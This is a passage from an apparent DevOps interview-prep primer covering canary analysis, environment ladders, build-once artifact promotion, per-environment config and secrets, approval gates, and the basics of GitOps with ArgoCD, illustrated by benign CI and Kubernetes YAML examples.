The point: analysis is only as good as the load behind it. For high-traffic services real traffic suffices; for low-traffic ones or for catching slow leaks, add mirroring/soak testing so the judge has enough signal to trust.

### Q13. What's wrong with a naive percentage-based canary that has no analysis?

A naive canary just **ramps traffic on a timer** — 10% for 5 minutes, then 50%, then 100% — with **no metric checks.** The flaw: it doesn't *catch* anything. It merely exposes the bug **slowly** instead of all at once.

- **No abort criteria** — if the new version is erroring, the timer keeps promoting it straight to 100%. You've automated shipping the bug, just gradually.
- **The human is still the safety net** — someone has to be watching dashboards and hit stop manually, which defeats the "automated" premise and fails at 3am.
- **False sense of safety** — "we do canary deployments" sounds safe but without analysis the canary provides *time*, not *protection*; the blast radius during the ramp is still real user impact.

The fix is exactly what turns a canary into **progressive delivery**: attach **automated analysis** at each step (query error rate / latency vs baseline) with an **abort condition**, so a failing canary rolls itself back instead of graduating. The traffic ramp is necessary but not sufficient — **the analysis is the safety mechanism.**

### Q14. How do canary duration and sample size affect the reliability of the analysis?

The analysis is a statistical judgement, so **too short or too little traffic makes it unreliable.**

- **Sample size** — at 5% traffic on a low-volume service, a one-minute window might see a handful of requests; a single error swings the error rate wildly, causing false aborts, while a real 1% regression stays invisible. You need enough requests per interval for the metric to be statistically meaningful.
- **Duration / bake time** — some failures are **latent**: memory leaks, connection-pool exhaustion, cache-fill effects, or a bad code path only hit by a rare request. A 2-minute canary misses them; a longer soak catches them. But too long slows delivery and consumes reviewer patience.
- **The tension** — short + small = fast but noisy and blind to slow failures; long + large = trustworthy but slow.

Levers to fix a weak signal: **raise canary traffic weight** (more requests per interval), **generate synthetic/mirror load**, **require N consecutive failing intervals** before aborting (noise immunity), and **size the bake time to the failure modes you actually fear.** The right duration and sample size are chosen against the service's traffic volume and its likely failure latency — there's no universal number.

### Q15. How does progressive delivery fit with GitOps?

They fit together cleanly because both are **declarative and controller-driven** — GitOps reconciles desired state from Git, and progressive delivery is just a richer desired-state spec whose reconciliation includes metric analysis.

- **The Rollout lives in Git** — the `Rollout`/`Canary` CR (steps, weights, `AnalysisTemplate`, thresholds) is committed like any other manifest. A deploy is a **git commit bumping the image digest**; Argo CD / Flux syncs it.
- **The controller runs the progression** — once synced, Argo Rollouts / Flagger executes the canary steps and analysis *in-cluster*, shifting traffic and aborting on metric breach — without a push-based CI job driving `kubectl`.
- **Rollback is a reconciliation, not a manual act** — a metric-triggered abort returns traffic to stable; and reverting the git commit (or the controller marking the rollout degraded) keeps Git and cluster consistent.
- **Auditability** — every release and its rollout policy is a reviewed, versioned commit; the pull-based agent applies it.

So GitOps supplies the *source of truth and reconciliation loop*, and progressive delivery supplies the *metric-gated rollout behaviour* on top. Together: commit the new digest, the in-cluster controller canaries it with automated analysis, and promotes or self-reverts — all declaratively, all in Git.
## Environments & Promotion

### Summary

**What this topic covers**

How code travels from a developer's laptop to production through a ladder of environments, and how a mature delivery pipeline moves the *same* artifact up that ladder instead of rebuilding at each step. Three concern areas live here: (1) the **environment ladder itself** — dev/CI, staging/pre-prod, production, plus the optional rungs (QA, UAT, canary) and what each one is actually *for*; (2) **parity and promotion** — why staging must mirror production (infra, config shape, data shape) and why you promote an immutable build-once artifact by digest rather than rebuilding per environment; and (3) **gates, config, and ephemerality** — manual approval gates, per-environment config and secrets injected at deploy time, and ephemeral preview environments spun up per pull request. The 16 questions here move from "name the environments and what they're for" to "design promotion for a regulated system with separation of duties and per-environment rollback."

**Mental model**

Think of environments as a series of increasingly production-like filters, each one cheaper to fail in than the next. A change earns its way up: it must pass CI in a throwaway environment, then survive staging (which should be a faithful mirror of prod), before a human — or an automated gate watching metrics — lets it into production. The single most important discipline is **build once, promote many**: CI produces one immutable artifact (a container digest, a versioned package), and every environment deploys *that exact artifact*, changing only the injected configuration. The moment you rebuild per environment, "works in staging" stops guaranteeing "works in prod" because the bits differ. The second discipline is **parity**: the closer staging is to prod in infrastructure, configuration mechanism, and data shape, the more bugs staging catches. Snowflake environments — hand-tuned, drifted, undocumented — are where "works on my machine" scales up into "works in staging, breaks in prod." Environments are cattle, configured from code, not pets.

**Key terms**

- **Environment ladder** — the ordered sequence dev/CI → QA → staging/pre-prod → production that a change is promoted through.
- **Environment parity** — how closely a lower environment (esp. staging) mirrors production in infra, config, and data shape.
- **Promotion** — advancing the *same* immutable artifact from one environment to the next, versus redeploying or rebuilding.
- **Build once, deploy many** — produce one artifact in CI; every environment deploys that identical digest.
- **Approval gate** — a required human sign-off (or automated check) before a deploy to a protected environment proceeds.
- **12-factor config** — keep config out of the image; inject environment-specific values (env vars, config maps, secret stores) at deploy time.
- **Ephemeral / preview environment** — a full, disposable environment created per PR/MR for review, torn down on merge or close.
- **Environment protection rules** — branch restrictions, required reviewers, wait timers guarding a protected environment.
- **Separation of duties** — the person who writes/merges code is not (necessarily) the person authorized to deploy to prod.
- **Configuration drift** — divergence between environments (or between an environment and its declared state) accumulated by manual changes.
- **Canary environment** — a slice of production (or a near-prod ring) that receives the new version first while metrics are watched.

**Why interviewers ask this**

Environment strategy is where a candidate reveals whether they've actually operated software or only shipped to one box. Junior signal: describes "dev, staging, prod" as three copies of the app and stops there, or rebuilds the artifact per environment without noticing the reproducibility hole. Senior signal: talks about parity as a first-class goal, insists on promoting a single digest, knows *when* a manual gate adds safety versus when it's compliance theatre that just slows MTTR, and has an opinion on ephemeral preview environments as a productivity multiplier. Platform interviewers especially probe config-and-secrets handling ("same artifact, different config — how?") and separation of duties, because getting those wrong causes both outages and audit failures. The strongest answers connect environments to the DORA metrics: more environments and heavier gates trade deploy frequency and lead time for perceived safety, and that trade should be deliberate.

**Common confusions**

- "Promotion means deploying the latest build to the next environment" — no; promotion means deploying the *specific artifact that passed the previous stage*, not a fresh build of `main`.
- "Staging is where we build the staging version" — there is no staging version; there is one artifact configured for staging. Rebuilding per environment defeats the purpose.
- "Config belongs in the image so it's reproducible" — config belongs *outside* the image; baking prod secrets or URLs into the image means one image can't serve multiple environments and leaks secrets into the registry.
- "More approval gates = safer" — gates add latency and can be pure theatre; an unread rubber-stamp approval provides no safety and hurts MTTR.
- "Preview environments are a luxury" — for many teams they're the biggest single review-quality and productivity win, catching integration bugs before merge.
- "Lower environments can use a copy of prod data" — usually a compliance and privacy violation; use anonymized/synthetic prod-*like* data instead.

**What follows from this topic**

Promotion assumes an immutable, versioned artifact — the packaging and artifact-repository discipline covered earlier in this primer. The deployment strategies (blue-green, canary, rolling) are how a promotion *lands* inside an environment, and blue-green is itself an environments pattern. Manual gates and config injection connect to [[GitOps & Pull-based CD]], where environment promotion becomes a Git operation (a PR from a staging overlay to a prod overlay) and per-environment config lives in a config repo. And the whole ladder is the substrate for Release Management — deciding *when* the artifact sitting in prod is actually released to users.

### Q1. Walk me through a typical environment ladder — what is each environment for?

A common ladder, cheapest-to-fail first:

- **Local / dev** — the developer's machine or a personal cloud dev environment. Fast iteration, no shared blast radius.
- **CI** — ephemeral, spun up per pipeline run to build and run tests, then destroyed. Not long-lived.
- **QA / test** — a shared environment where integrated changes are exercised by automated suites and sometimes manual testers.
- **Staging / pre-prod** — the faithful mirror of production. Same infra topology, same config *mechanism*, prod-like data shape. Last chance to catch "works elsewhere, breaks in prod" issues.
- **UAT** — user/stakeholder acceptance, when a business owner signs off before release. Sometimes merged with staging.
- **Canary** — a slice of production itself (or a near-prod ring) that receives the new version first while you watch metrics.
- **Production** — real users, real data, real money.

Not every team runs all rungs. The point isn't the count — it's that each rung is more production-like and more expensive to fail in than the last, so a change is filtered progressively. The senior instinct is to have *as few* rungs as give you confidence: every extra environment is cost, drift surface, and lead-time tax.

### Q2. What is environment parity and why does it matter?

**Parity** is how closely a lower environment matches production across three axes: **infrastructure** (same orchestrator, same networking topology, same instance types within reason), **configuration** (same *mechanism* for injecting config and secrets, even if values differ), and **data shape** (same schema, similar volumes and distributions, realistic edge cases).

It matters because staging only earns its keep if passing staging *predicts* passing prod. The classic failure is the snowflake: staging has a different database version, a hand-edited config, or a tiny toy dataset, so a query that's fine on 100 rows melts on 100 million, or a config path that exists in prod doesn't in staging. That's the "works in staging, breaks in prod" trap.

You buy parity with infrastructure-as-code (both environments provisioned from the same modules), the build-once artifact (identical bits), and disciplined config injection. You'll never get 100% parity — prod has scale and real traffic staging can't cheaply replicate — so the honest goal is parity in *everything that isn't scale*, plus canary/observability to catch what only shows up at scale.

### Q3. Explain "build once, deploy many" and why rebuilding per environment is a bug.

You build **one** immutable artifact in CI — a container image referenced by its digest, or a versioned package — and every environment deploys *that exact artifact*. Only the injected configuration changes.

Rebuilding per environment breaks the core guarantee of a deployment pipeline: that what you tested is what you ship. If staging builds from `main` at 2pm and prod rebuilds from `main` at 4pm, a dependency floated, a base image updated, or a transient build input changed — and now the prod bits differ from the bits that passed staging. Every test you ran is invalidated.

```yaml
# GitHub Actions: build once, then promote the same digest
jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      digest: ${{ steps.push.outputs.digest }}
    steps:
      - uses: actions/checkout@v4
      - id: push
        uses: docker/build-push-action@v6
        with:
          push: true
          tags: ghcr.io/acme/my-app:${{ github.sha }}
  deploy-staging:
    needs: build
    environment: staging
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh ghcr.io/acme/my-app@${{ needs.build.outputs.digest }} staging
  deploy-prod:
    needs: [build, deploy-staging]
    environment: production   # requires reviewers
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh ghcr.io/acme/my-app@${{ needs.build.outputs.digest }} prod
```

Note prod deploys the **same digest** staging validated — not a rebuild.

### Q4. How do you handle configuration and secrets that differ per environment when the artifact is identical?

Follow 12-factor: **config lives in the environment, not the image**. The artifact ships with *no* environment-specific values baked in; the deploy step injects them.

Mechanisms, from simplest:

- **Environment variables** — the baseline; the orchestrator sets `DATABASE_URL`, `LOG_LEVEL`, etc. per environment.
- **Config maps** — Kubernetes ConfigMaps (non-secret) mounted or exposed as env vars.
- **Secret stores** — Vault, AWS Secrets Manager, GCP Secret Manager, or Kubernetes Secrets (ideally backed by external-secrets). The pod pulls secrets at deploy/runtime; they never touch the image or the repo.

```yaml
# Kubernetes: same image, environment-specific config injected
containers:
  - name: my-app
    image: ghcr.io/acme/my-app@sha256:abc123   # identical across envs
    envFrom:
      - configMapRef: { name: my-app-config }   # per-env, non-secret
      - secretRef:    { name: my-app-secrets }  # per-env, from secret store
```

Two rules: (1) **never** bake secrets into the image — anyone who can pull the image gets them, and they're immortalized in registry layers; (2) keep the *mechanism* identical across environments (parity), so a missing-config bug surfaces in staging, not prod.

### Q5. What are ephemeral / preview environments and why are they a big deal?

An **ephemeral (preview) environment** is a full, disposable copy of your app spun up automatically for a single pull request, and torn down when the PR merges or closes. Reviewers get a live URL to click through the actual change, not just read a diff.

The productivity win is large: integration bugs, visual regressions, and "this API contract doesn't actually work end-to-end" problems get caught *before* merge, by a human interacting with the running change. It also decouples reviewers from local setup.

- **Vercel / Netlify** — automatic preview deploys per PR, unique URL, out of the box.
- **GitLab review apps** — `environment: { name: review/$CI_COMMIT_REF_SLUG, on_stop: stop_review }` spins up and tears down per branch.
- **Kubernetes** — a per-PR namespace provisioned by the pipeline, DNS wired to the PR number, destroyed on close.

```yaml
# GitLab review app: create on push, auto-stop on branch delete/merge
review:
  stage: deploy
  script: ./deploy.sh review-$CI_COMMIT_REF_SLUG
  environment:
    name: review/$CI_COMMIT_REF_SLUG
    url: https://$CI_COMMIT_REF_SLUG.review.acme.dev
    on_stop: stop_review
```

The cost is real (compute, seeding data, teardown discipline), so keep them lean and *always* tear them down — leaked preview environments become a cost and security liability.

### Q6. When does a manual approval gate add real safety, and when is it theatre?

A manual gate is a required human sign-off before a deploy to a protected environment proceeds — GitHub `environments` with required reviewers, GitLab manual jobs, or an external change-approval step.

**It adds real safety when** the approver actually inspects something a machine can't: the business context ("is now a safe time — are we mid-Black-Friday?"), a diff of what's about to change, canary metrics from a prior ring, or a coordinated multi-service release. The gate is a genuine decision point.

**It's theatre when** the approver rubber-stamps without looking, or approves based on information the pipeline already verified automatically. Then the gate provides zero safety and pure latency — it inflates lead time and MTTR (you can't ship the fix until someone wakes up to click approve).

The senior take: prefer *automated* gates (tests, canary analysis, policy checks) that are objective and fast, and reserve *human* gates for genuinely human judgments. If a gate exists only to satisfy an auditor, make the approval cheap and well-informed (show the diff and the canary dashboard at the click), and measure whether it ever actually catches anything. Continuous Deployment removes the human gate entirely by making the automated gates trustworthy enough.

### Q7. How do you configure environment protection in GitHub Actions?

GitHub **environments** attach protection rules to a deploy target. A job that declares `environment: production` can't run until the rules pass.

```yaml
jobs:
  deploy-prod:
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://app.acme.com
    steps:
      - run: ./deploy.sh prod
```

In the environment settings you configure:

- **Required reviewers** — up to N named people/teams must approve before the job runs (the manual gate).
- **Wait timer** — force a delay (e.g. 10 minutes) before deploy, giving a window to abort.
- **Deployment branches** — restrict which branches can deploy to this environment (e.g. only `main` reaches production).
- **Environment secrets** — secrets scoped to this environment only, so a staging job can't read prod credentials.

The last point is the security win: **scoping secrets to the environment** means the prod database password is only available to jobs that target `production`, not to every workflow. Combine with OIDC so even those are short-lived cloud credentials, not long-lived keys.

### Q8. What's the difference between promoting an artifact and redeploying?

**Promotion** moves a *specific, already-validated artifact* forward to the next environment — same digest, new config. It's how a change advances the ladder: the exact bits that passed staging are what land in prod.

**Redeploy** re-applies an artifact to the *same* environment — usually to recover (roll back to a previous known-good digest), to pick up a config change, or to replace unhealthy instances. No new validation stage is crossed.

The distinction matters operationally: promotion is a forward step gated by the previous environment's results; redeploy is a lateral/backward action for recovery or config refresh. A rollback is a redeploy of the previous good artifact into the current environment — fast precisely *because* you kept the old immutable artifact around and don't rebuild. If your "rollback" involves rebuilding an old commit, you've conflated the two and made recovery slow and risky.

### Q9. How should you manage data across environments — and what must you never do?

The rule you must never break: **no raw production data in lower environments.** It's a privacy and compliance violation (GDPR/CCPA/PCI), and it makes every developer laptop and staging box a breach target.

Instead:

- **Synthetic data** — generated to match the schema and realistic distributions. Safest, but must be maintained to stay realistic.
- **Anonymized / masked prod data** — a copy of prod with PII irreversibly scrubbed or tokenized (names, emails, card numbers). Gives realistic shape and volume without exposing real people. The masking pipeline itself must be trusted and audited.
- **Subset + mask** — take a representative slice, then anonymize, to keep lower environments cheap.

You want prod-*like* data (right shape, right scale, nasty edge cases) precisely because parity in data is what catches the "fine on 100 rows, dies on 100M" class of bug. But "prod-like" is achieved through generation or masking, never by copying real records down. Also keep schema migrations flowing *up* the ladder the same way code does, so staging exercises the migration before prod does.

### Q10. What is separation of duties in a deploy pipeline and how do you enforce it?

**Separation of duties (SoD)** means the person who authors/merges a change isn't automatically the person who authorizes its deploy to production. It limits both mistakes and insider risk, and it's frequently a hard compliance requirement (SOX, SOC 2, PCI).

Enforcement in practice:

- **Environment required reviewers** — the prod environment requires approval from a person *other than* the PR author (some setups explicitly forbid self-approval).
- **RBAC on deploy** — only a release-manager role can trigger prod deploys; developers can deploy to staging but not prod.
- **Branch protections** — prod deploys only from `main`, and `main` requires review to merge.
- **Audit trail** — every prod deploy records who triggered it, who approved it, and which artifact/digest shipped.

The tension is with speed: strict SoD can bottleneck on a small approver pool and hurt MTTR during incidents. Mature teams keep SoD but make it low-latency — a rotating on-call approver, or automated policy checks that satisfy the control without a human blocking every deploy. In GitOps, SoD falls out naturally: the change is a reviewed, merged PR to the config repo, and the merge *is* the authorization.

### Q11. How does blue-green deployment relate to environments?

Blue-green is a **deployment strategy that is itself an environments pattern**. You run two full production environments — "blue" (current live) and "green" (the new version) — behind a router. You deploy and warm up the new version in green while blue serves all traffic, then **flip** the router so green is live. Blue stays intact as an instant rollback target.

```text
        ┌─ router ─┐
users → │  → blue  │  (live)      deploy new version to green,
        │    green │  (idle)      smoke-test, then flip router
        └──────────┘              rollback = flip back to blue
```

Why it fits here: green is effectively a short-lived production-parity environment that becomes production at the flip. The upsides are near-zero-downtime cutover and instant rollback (flip back). The costs are running two full prod-scale environments (double the infra during the window) and handling stateful concerns — database migrations must be backward-compatible so both blue and green can run against the same schema during the transition. Contrast with canary, which shifts a *percentage* of traffic gradually rather than flipping all at once; blue-green is all-or-nothing but simpler to reason about and to reverse.

### Q12. How do feature flags interact with environments and promotion?

Feature flags let you **decouple deploy from release**, and that changes how you use environments. The same artifact is promoted up the ladder with a feature *off*, so the code is present in prod but dormant. You then enable it per environment, per user segment, or per percentage — without another deploy.

This is powerful for environment strategy:

- **Per-environment flag state** — a feature can be on in staging (for testing) and off in prod, using the same artifact.
- **Progressive rollout in prod** — flip the flag on for 1% → 10% → 100%, watching metrics, no redeploy.
- **Kill switch** — turn a misbehaving feature off in prod instantly, faster and safer than a rollback.

The caution: flags are config, and config drifts. Flag state that differs between environments in *unexpected* ways reintroduces the snowflake problem — "it worked in staging because a flag was on there and off in prod." Manage flags declaratively (in the flag service, versioned), audit them, and *clean them up* — long-lived stale flags become a combinatorial testing nightmare. Flags complement environment promotion; they don't replace the discipline of promoting one artifact.

### Q13. Design an environment/promotion strategy for a small startup versus a regulated enterprise.

**Startup (optimize for speed):**

- Ladder: preview-per-PR → staging → prod. Three rungs, maybe skip a dedicated QA.
- Promotion: build once in CI; auto-promote to staging on merge; **automated** gate (tests + smoke) then auto-deploy or one-click to prod. Lean toward Continuous Deployment.
- Data: synthetic/masked, small.
- Rollback: keep last N digests; one-command redeploy of previous good.
- Rationale: few humans, high trust, MTTR over ceremony. Every extra gate is lead-time tax you can't afford.

**Regulated enterprise (optimize for auditability):**

- Ladder: dev → QA → staging (full parity) → UAT → prod, plus canary ring.
- Promotion: build once; artifact signed (cosign) and stored immutably; promotion requires **separation of duties** — a release manager approves prod, distinct from the author. Every promotion is logged with who/what/when/which-digest.
- Config/secrets: from a secret store, scoped per environment; nothing in images.
- Data: strictly anonymized; no prod data below prod, ever.
- Rollback: documented runbook, tested regularly, per-environment.
- Rationale: the cost of a bad prod change (regulatory, financial) dominates, so gates and audit trails earn their latency.

The through-line: same *technical* backbone (build once, promote a digest, config injected, immutable artifacts) — the difference is how many gates and how much audit you bolt on, driven by blast radius and compliance, not fashion.

### Q14. What causes environment drift and how do you prevent it?

**Drift** is when environments diverge from each other, or from their declared state, through changes nobody codified — a hotfix `kubectl edit` in prod, a manually bumped instance size in staging, a config tweaked live during an incident and never written back.

Consequences: parity erodes (staging stops predicting prod), and incidents get harder because nobody knows the *actual* running state.

Prevention:

- **Everything from code** — infrastructure via IaC (Terraform/Pulumi), config via versioned files. No environment is created or modified by hand.
- **Same modules across environments** — dev/staging/prod instantiate the same IaC modules with different parameters, so they can't structurally diverge.
- **GitOps reconciliation** — an in-cluster agent continuously reverts any manual change back to what Git declares (self-heal), so drift is *actively* corrected, not just discouraged. This is [[GitOps & Pull-based CD]]'s headline feature.
- **Drift detection** — `terraform plan` in CI on a schedule, or ArgoCD's OutOfSync status, alerts when reality diverges from declared state.

The mindset: environments are immutable and reproducible. If you need a change, you change the code and let the pipeline apply it everywhere — you never reach into a running environment and adjust it by hand.

### Q15. Should you promote through gated environments, or deploy continuously to production?

It's a spectrum, and the right point depends on how trustworthy your automated checks are.

**Gated promotion** (Continuous Delivery): the artifact climbs the ladder, pausing at human gates. Every green build is *releasable*, a human decides when. Good when releases carry business/coordination risk, when compliance demands sign-off, or when your automated confidence isn't yet high enough to remove the human.

**Continuous Deployment**: every green build auto-ships straight to prod, no human gate — the automated gates (comprehensive tests, canary analysis, automated rollback on metric regression) *are* the safety. Good when you've invested enough in testing and observability that a human staring at the pipeline adds nothing but latency, and it maximizes deploy frequency and shrinks lead time (two DORA metrics).

The senior framing: the gate should exist only where a human genuinely adds judgment a machine can't. Teams often run a hybrid — continuous deployment to staging and canary, a lightweight gate (or automated canary analysis) before full prod rollout. The direction of travel for high-performing teams is *removing* gates by making the automated checks trustworthy, not adding gates to compensate for weak testing. A gate is a confession that you don't trust your pipeline; sometimes that's honest, sometimes it's just fear.

### Q16. What's the cost of running many environments, and how do you keep it under control?

Every environment costs on several axes: **compute/infra** (staging at prod-parity can approach prod cost), **drift surface** (more environments, more places to diverge), **cognitive load** (more state to reason about during incidents), and **lead-time tax** (more rungs and gates between commit and prod).

Controls:

- **Fewest rungs that give confidence** — don't run QA *and* staging *and* UAT if two of them test the same thing. Each rung must earn its keep.
- **Ephemeral over always-on** — preview environments per PR that tear down on close cost only while a PR is open, versus a permanent shared environment burning money 24/7.
- **Scale-down lower environments** — staging needs prod *shape*, not prod *scale*; run it smaller and scale up only for load tests. (Accept the parity trade explicitly.)
- **Auto-teardown discipline** — leaked ephemeral environments are a classic silent cost sink; enforce TTLs and stop-hooks.
- **Shared platform tooling** — provision all environments from the same IaC so adding/removing one is cheap and consistent.

The senior instinct is to treat environments as a *budget*, not a default. The question is never "should we add another environment?" but "what confidence does this environment buy, and is that worth its cost and lead-time tax?" Parity where it catches bugs; ephemerality and scale-down everywhere else.

## GitOps & Pull-based CD

### Summary

**What this topic covers**

The GitOps model of continuous delivery: declare the entire desired state of your system in Git, and let an automated agent running *inside* the target continuously reconcile the running system to match. Three concern areas: (1) **the model and its principles** — declarative, versioned-and-immutable-in-Git, pulled automatically, continuously reconciled — and the pivotal shift from CI *pushing* deployments to an in-cluster agent *pulling* them; (2) **the tooling** — ArgoCD (Applications, sync, self-heal, app-of-apps, ApplicationSets) and Flux (GitRepository/Kustomization/HelmRelease controllers, image automation); and (3) **the operational payoff and its hard parts** — drift detection and self-heal, rollback as `git revert`, the CI/CD repo split, secrets management when you can't commit plaintext, and progressive delivery on top. The 16 questions run from "what is GitOps" to "design the config-repo layout and CI/CD split for a multi-cluster fleet, and explain the security win of pull over push."

**Mental model**

GitOps inverts the direction of deployment. In the traditional model, your CI pipeline holds cluster credentials and *pushes* changes outward — `kubectl apply`, `helm upgrade` — from the outside in. In GitOps, an **agent living inside the cluster pulls** the desired state from Git and reconciles continuously: it watches a repo, notices the live state differs from the declared state, and converges them. Git becomes the single source of truth *and* the audit log — every change to production is a commit, reviewed via PR, revertable. The reconciliation loop is the heart of it: desired state (Git) and actual state (cluster) are continuously compared, and the agent closes the gap in *both* directions — a manual `kubectl edit` gets reverted back to Git (self-heal), because Git, not the cluster, is authoritative. Stop thinking "run a deploy command" and start thinking "change the declared state; the system converges." Deployment stops being an *event* the pipeline fires and becomes a *property* the agent maintains.

**Key terms**

- **GitOps** — operating model where Git holds the declarative desired state and an automated agent reconciles the system to match it.
- **Reconciliation loop** — the agent's continuous compare-desired-vs-actual-and-converge cycle.
- **Pull-based CD** — the agent inside the target pulls state from Git, versus a pipeline pushing from outside.
- **Desired state** — the declarative manifests (Kustomize/Helm/plain YAML) in Git describing what should run.
- **Drift** — divergence of live state from declared state; GitOps detects and (with self-heal) reverts it.
- **Self-heal** — the agent automatically reverting out-of-band changes back to Git's declared state.
- **ArgoCD Application** — a CRD pointing at a repo/path/target-cluster that ArgoCD keeps in sync.
- **App-of-apps** — an ArgoCD Application whose contents are *other* Applications, bootstrapping a whole fleet from one root.
- **ApplicationSet** — templated generation of many Applications (per cluster/env/PR) from a generator.
- **Flux controllers** — GitRepository, Kustomization, HelmRelease, ImageUpdateAutomation: the composable CNCF GitOps toolkit.
- **Config/deploy repo** — the repo holding manifests, separate from the application source repo.
- **Sealed-secrets / SOPS / external-secrets** — patterns for handling secrets when plaintext can't live in Git.

**Why interviewers ask this**

GitOps is the current center of gravity for Kubernetes delivery, so interviewers use it to separate people who've *operated* clusters at scale from people who've only run `kubectl apply` by hand. Junior signal: describes GitOps as "storing YAML in Git" and misses the reconciliation loop and the pull inversion entirely. Senior signal: articulates the push-vs-pull *security* argument (CI never holds cluster credentials; the cluster reaches out), explains the CI/CD repo split (CI builds the image and bumps a tag in the config repo; the agent deploys), has a real answer for secrets (you *can't* commit plaintext, so sealed-secrets/SOPS/external-secrets), and knows rollback is `git revert`. Platform interviewers push on multi-cluster scaling (ApplicationSets, app-of-apps), drift/self-heal semantics, and how progressive delivery layers on. Weak candidates treat ArgoCD as a fancier deploy button; strong ones treat Git as the control plane.

**Common confusions**

- "GitOps is just keeping manifests in Git" — storing YAML in Git is a prerequisite, not GitOps; GitOps is the *continuous reconciliation* by an agent that makes Git authoritative over the live system.
- "GitOps replaces CI" — no; CI still builds and tests and produces the image. GitOps replaces the *CD/push* half — the agent deploys. The two live in different repos.
- "The pipeline runs kubectl against the cluster" — that's push-based; in GitOps the *cluster's* agent pulls, and CI has no cluster credentials.
- "You commit your secrets to the config repo" — never plaintext; use sealed-secrets, SOPS-encrypted files, or external-secrets referencing a real secret store.
- "Self-heal is dangerous because it undoes my hotfix" — that's the point: out-of-band changes are drift; the fix is a *commit*, not a live edit. Self-heal enforces Git as truth.
- "ArgoCD and Flux are competitors you must choose between" — they solve the same problem differently; both are CNCF graduated, and the choice is about UI/opinionation vs composability, not one being obsolete.

**What follows from this topic**

GitOps is the deployment substrate that makes [[Environments & Promotion]] concrete on Kubernetes: promotion becomes a PR from a staging overlay to a prod overlay, and separation of duties falls out of PR review. Its drift/self-heal directly solves the environment-drift problem raised there. The CI half of the split assumes the immutable, digest-addressed artifact from this primer's packaging topic — GitOps deploys a *digest*, never a rebuilt commit. Progressive delivery (Argo Rollouts/Flagger) layers canary and blue-green onto the reconciliation loop, tying back to the deployment-strategies topic. And rollback-as-`git revert` connects straight into [[Release Management & Versioning]], where release history *is* Git history.

### Q1. What is GitOps?

**GitOps is an operating model where the entire desired state of your system is declared in Git, and an automated agent continuously reconciles the running system to match Git.** Git is both the single source of truth and the audit log: every change to production is a commit, reviewed through a pull request, and revertable.

The load-bearing word is **reconciles**. It's not "we keep our YAML in version control" — lots of teams do that and aren't doing GitOps. It's that an agent (ArgoCD, Flux) runs a continuous loop: read desired state from Git, observe actual state in the cluster, and converge them. If they match, do nothing. If they differ — someone committed a change, or someone hand-edited the cluster — act to make actual match desired.

Two consequences fall out immediately. First, deployment stops being a command you run and becomes a state you declare; you `git push` a change and the system converges to it. Second, the cluster's live state is *governed* by Git — a manual change is drift the agent will (optionally) revert. Combined, you get a fully auditable, reviewable, self-correcting delivery system where "what's in prod" is answerable by reading a Git repo.

### Q2. What are the four principles of GitOps?

1. **Declarative** — the entire system is described declaratively (what should be true), not as imperative steps. Kubernetes manifests, Kustomize overlays, Helm values — desired state, not `kubectl` commands.

2. **Versioned and immutable** — that desired state is stored in Git, giving an immutable, versioned, auditable history. Every change is a commit; you can see who changed what, when, and why, and roll back to any prior state.

3. **Pulled automatically** — an agent *pulls* the approved desired state from Git automatically. No human runs a deploy; no external system pushes in. The agent detects new commits and applies them.

4. **Continuously reconciled** — the agent runs a control loop that continuously observes actual state and reconciles it toward desired state, correcting drift in both directions.

Together these turn Git into a control plane. Principle 1 makes state comparable (declarative state can be diffed); 2 makes it auditable and revertable; 3 makes it secure (pull, not push — no external credentials); 4 makes it self-healing. Miss any one and you have something weaker: declarative-in-Git without reconciliation is just "manifests in version control."

### Q3. Explain push-based versus pull-based deployment and the security implication.

| | Push-based (traditional CI/CD) | Pull-based (GitOps) |
|---|---|---|
| Who initiates | CI pipeline pushes out | In-cluster agent pulls in |
| Deploy command | `kubectl`/`helm` from the runner | Agent applies from Git |
| Cluster credentials | Held by CI (external system) | Never leave the cluster |
| Trigger | Pipeline runs on merge | Agent detects new commit |
| Drift correction | None (fire-and-forget) | Continuous reconciliation |
| Audit | Pipeline logs | Git history |

The **security win** is the headline. In push mode, your CI system holds credentials that can modify production clusters. CI runners are a juicy target: they run third-party actions, build untrusted PR code, and are internet-reachable. Compromise the runner (or a malicious dependency in a build) and the attacker has cluster admin.

In pull mode, **credentials never leave the cluster**. The agent runs *inside* the target and reaches *out* to Git (read-only) and to an image registry. There is no inbound path from CI to the cluster, and CI has no cluster credentials to steal. You've shrunk the blast radius of a CI compromise from "attacker owns prod" to "attacker can open a PR" — which still faces review. That inversion — the cluster pulls instead of being pushed to — is the core reason GitOps is considered more secure at scale.

### Q4. Walk me through ArgoCD's core model.

ArgoCD's central object is the **Application** CRD: it points at a Git repo, a path within it, and a destination cluster/namespace, and declares that ArgoCD should keep that destination in sync with that path.

```yaml
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: my-app
  namespace: argocd
spec:
  project: default
  source:
    repoURL: https://github.com/acme/my-app-config.git
    path: overlays/production
    targetRevision: main
  destination:
    server: https://kubernetes.default.svc
    namespace: my-app
  syncPolicy:
    automated:
      prune: true      # delete resources removed from Git
      selfHeal: true   # revert out-of-band changes
```

Key pieces:

- **Sync** — ArgoCD compares the rendered manifests at `path` against the live cluster and applies the difference. Manual or `automated`.
- **Sync status** — `Synced` (live matches Git) or `OutOfSync` (drift). **Health status** — is the resource actually healthy (pods ready, etc.), orthogonal to sync.
- **Self-heal** — with `selfHeal: true`, a manual `kubectl edit` is reverted back to Git.
- **Prune** — resources deleted from Git get deleted from the cluster.
- **Sync waves / hooks** — order resources within a sync (`argocd.argoproj.io/sync-wave`) and run pre/post-sync jobs (migrations).
- **The UI** — a real-time tree of every resource, its sync and health status, diffs, and one-click rollback to a prior Git revision.

### Q5. What is the app-of-apps pattern and when do you use it?

**App-of-apps** is an ArgoCD Application whose Git path contains, not workloads, but *other* Application manifests. The root Application syncs the child Applications, each of which syncs its own workload. One root bootstraps an entire fleet.

```yaml
# root "bootstrap" Application -> path contains child Application YAMLs
spec:
  source:
    repoURL: https://github.com/acme/platform-config.git
    path: apps            # this dir holds Application manifests, not Deployments
```

```text
root Application (apps/)
 ├── Application: ingress-nginx
 ├── Application: cert-manager
 ├── Application: monitoring
 └── Application: my-app (prod)
```

You use it to **bootstrap and manage a cluster declaratively from a single entry point**: point ArgoCD at the root once, and every platform component and app installs itself. Adding a new app is a commit that adds a child Application manifest. It centralizes fleet composition in Git and makes standing up a fresh cluster a one-liner (apply the root).

